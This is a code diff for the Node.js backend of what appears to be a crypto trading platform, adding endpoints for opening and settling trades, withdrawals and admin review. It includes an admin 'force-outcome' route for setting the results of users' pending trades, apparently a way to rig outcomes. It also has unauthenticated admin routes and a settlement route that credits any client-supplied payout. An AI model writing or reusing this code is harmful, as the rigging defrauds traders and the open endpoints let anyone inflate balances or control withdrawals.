@@ -487,6 +487,7 @@ app.get('/api/admin/users', async (req, res) => {
         SELECT u.*, 
                (SELECT COUNT(*) FROM trades t WHERE t.wallet_address = u.wallet_address AND t.status = 'pending') as active_trades_count
         FROM geko_users u 
+        WHERE u.wallet_address IS NOT NULL AND u.wallet_address != ''
         ORDER BY last_seen DESC
       `);
       return res.json(result.rows);
@@ -685,6 +686,222 @@ app.get('/api/user/balance', async (req, res) => {
   } catch (e) {
     console.error('Balance query error:', e.message);
     return res.status(500).json({ error: 'Balance query failed' });
+  }
+});
+
+// ─── Trade endpoints ───────────────────────────────────────────────────────
+app.get('/api/user/active-trades', async (req, res) => {
+  const { address } = req.query;
+  if (!address) return res.status(400).json({ error: 'Address required' });
+  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
+
+  try {
+    const result = await pool.query(
+      "SELECT * FROM trades WHERE wallet_address = $1 AND status = 'pending' ORDER BY created_at DESC",
+      [address]
+    );
+    res.json(result.rows);
+  } catch (e) {
+    console.error('Fetch active trades error:', e.message);
+    res.status(500).json({ error: e.message });
+  }
+});
+
+app.post('/api/execute-trade', async (req, res) => {
+  const { walletAddress, asset, tradeSize, leverage, type, isDemo, entryPrice, duration, tradeId } = req.body;
+  if (!walletAddress || !tradeSize) return res.status(400).json({ error: 'Missing parameters' });
+  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
+
+  try {
+    const amt = Math.abs(parseFloat(tradeSize));
+    const balanceField = isDemo ? 'demo_balance' : 'trading_balance';
+    
+    // Check balance
+    const userRes = await pool.query(`SELECT ${balanceField} FROM geko_users WHERE wallet_address = $1`, [walletAddress]);
+    if (userRes.rows.length === 0) return res.status(404).json({ error: 'User not found' });
+    
+    const balance = parseFloat(userRes.rows[0][balanceField] || 0);
+    if (balance < amt) return res.status(400).json({ error: 'Insufficient balance' });
+
+    // Deduct balance
+    await pool.query(`UPDATE geko_users SET ${balanceField} = ${balanceField} - $1 WHERE wallet_address = $2`, [amt, walletAddress]);
+
+    // Insert trade record
+    await pool.query(
+      `INSERT INTO trades (id, wallet_address, symbol, direction, amount, entry_price, duration, is_demo, status)
+       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, 'pending')`,
+      [tradeId || Math.random().toString(36).substring(7), walletAddress, asset, type, amt, entryPrice, duration, isDemo || false]
+    );
+
+    // Record transaction
+    await recordTransaction({
+      wallet_address: walletAddress,
+      asset_symbol: 'USDT',
+      amount: -amt,
+      type: 'trade',
+      reference: `trade-open:${tradeId}`
+    });
+
+    res.json({ success: true, message: 'Trade executed' });
+  } catch (e) {
+    console.error('Execute trade error:', e.message);
+    res.status(500).json({ error: e.message });
+  }
+});
+
+app.post('/api/settle-trade', async (req, res) => {
+  const { walletAddress, asset, payout, tradeRef, isDemo, status } = req.body;
+  if (!walletAddress || payout === undefined) return res.status(400).json({ error: 'Missing parameters' });
+  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
+
+  try {
+    const amt = parseFloat(payout);
+    const balanceField = isDemo ? 'demo_balance' : 'trading_balance';
+
+    // Update trade record
+    await pool.query(
+      "UPDATE trades SET status = $1, settled_at = NOW() WHERE id = $2 AND wallet_address = $3",
+      [status || 'settled', tradeRef, walletAddress]
+    );
+
+    // Credit balance if payout > 0
+    if (amt > 0) {
+      await pool.query(`UPDATE geko_users SET ${balanceField} = ${balanceField} + $1 WHERE wallet_address = $2`, [amt, walletAddress]);
+      
+      // Record transaction
+      await recordTransaction({
+        wallet_address: walletAddress,
+        asset_symbol: 'USDT',
+        amount: amt,
+        type: 'trade',
+        reference: `trade-settle:${tradeRef}`
+      });
+    }
+
+    res.json({ success: true, message: 'Trade settled' });
+  } catch (e) {
+    console.error('Settle trade error:', e.message);
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ─── Withdrawal endpoints ──────────────────────────────────────────────────
+app.post('/api/request-withdrawal', async (req, res) => {
+  const { walletAddress, destinationAddress, amount, asset } = req.body;
+  if (!walletAddress || !destinationAddress || !amount || !asset)
+    return res.status(400).json({ success: false, error: 'Missing required fields' });
+  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
+
+  try {
+    const balance = await getUserBalance(walletAddress, asset);
+    if (balance < parseFloat(amount))
+      return res.status(400).json({ success: false, error: `Insufficient balance. Available: ${balance} ${asset}` });
+
+    const result = await pool.query(
+      `INSERT INTO withdrawal_requests (wallet_address, destination_address, amount, asset, status)
+       VALUES ($1, $2, $3, $4, 'pending') RETURNING *`,
+      [walletAddress, destinationAddress.trim(), parseFloat(amount), asset]
+    );
+
+    return res.json({ success: true, requestId: result.rows[0].id });
+  } catch (e) {
+    console.error('Withdrawal request error:', e.message);
+    return res.status(500).json({ success: false, error: e.message });
+  }
+});
+
+// ─── Admin Trade endpoints ─────────────────────────────────────────────────
+app.get('/api/admin/active-trades', async (req, res) => {
+  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
+  try {
+    const result = await pool.query("SELECT * FROM trades WHERE status = 'pending' ORDER BY created_at DESC");
+    res.json(result.rows);
+  } catch (e) {
+    console.error('Admin active trades error:', e.message);
+    res.status(500).json({ error: e.message });
+  }
+});
+
+app.post('/api/admin/force-outcome', async (req, res) => {
+  const { tradeId, forceOutcome } = req.body;
+  if (!tradeId || !forceOutcome) return res.status(400).json({ error: 'tradeId and forceOutcome required' });
+  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
+  try {
+    await pool.query('UPDATE trades SET force_outcome = $1 WHERE id = $2', [forceOutcome, tradeId]);
+    res.json({ success: true });
+  } catch (e) {
+    console.error('Force outcome error:', e.message);
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ─── Admin Withdrawal endpoints ───────────────────────────────────────────
+app.get('/api/admin/withdrawal-requests', async (req, res) => {
+  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
+  try {
+    const result = await pool.query(
+      `SELECT wr.*, u.nickname,
+              (SELECT protocol_settlement_balance FROM geko_users WHERE wallet_address = wr.wallet_address) AS current_balance
+         FROM withdrawal_requests wr
+         LEFT JOIN geko_users u ON u.wallet_address = wr.wallet_address
+         ORDER BY wr.created_at DESC
+         LIMIT 200`
+    );
+    return res.json(result.rows);
+  } catch (e) {
+    console.error('Admin withdrawal-requests error:', e.message);
+    return res.status(500).json({ error: e.message });
+  }
+});
+
+app.post('/api/admin/approve-withdrawal', async (req, res) => {
+  const { requestId } = req.body;
+  if (!requestId) return res.status(400).json({ success: false, error: 'requestId required' });
+  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
+
+  try {
+    const wrRes = await pool.query('SELECT * FROM withdrawal_requests WHERE id = $1', [requestId]);
+    if (!wrRes.rows.length) return res.status(404).json({ success: false, error: 'Request not found' });
+    const wr = wrRes.rows[0];
+    if (wr.status !== 'pending') return res.status(400).json({ success: false, error: 'Request not pending' });
+
+    const balance = await getUserBalance(wr.wallet_address, wr.asset);
+    if (balance < parseFloat(wr.amount)) return res.status(400).json({ success: false, error: 'Insufficient user balance' });
+
+    // 1. Mark as approved
+    await pool.query('UPDATE withdrawal_requests SET status = $1, processed_at = NOW() WHERE id = $2', ['approved', requestId]);
+
+    // 2. Debit balance
+    if (wr.asset === 'USDT') {
+        await pool.query('UPDATE geko_users SET protocol_settlement_balance = protocol_settlement_balance - $1 WHERE wallet_address = $2', [wr.amount, wr.wallet_address]);
+    }
+    
+    await recordTransaction({
+      wallet_address: wr.wallet_address,
+      asset_symbol: wr.asset,
+      amount: -parseFloat(wr.amount),
+      type: 'withdrawal',
+      reference: `withdrawal-approved:${requestId}`
+    });
+
+    return res.json({ success: true });
+  } catch (e) {
+    console.error('Approve withdrawal error:', e.message);
+    return res.status(500).json({ success: false, error: e.message });
+  }
+});
+
+app.post('/api/admin/reject-withdrawal', async (req, res) => {
+  const { requestId, note } = req.body;
+  if (!requestId) return res.status(400).json({ success: false, error: 'requestId required' });
+  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
+
+  try {
+    await pool.query('UPDATE withdrawal_requests SET status = $1, admin_note = $2, processed_at = NOW() WHERE id = $3', ['rejected', note, requestId]);
+    return res.json({ success: true });
+  } catch (e) {
+    console.error('Reject withdrawal error:', e.message);
+    return res.status(500).json({ error: e.message });
   }
 });
 
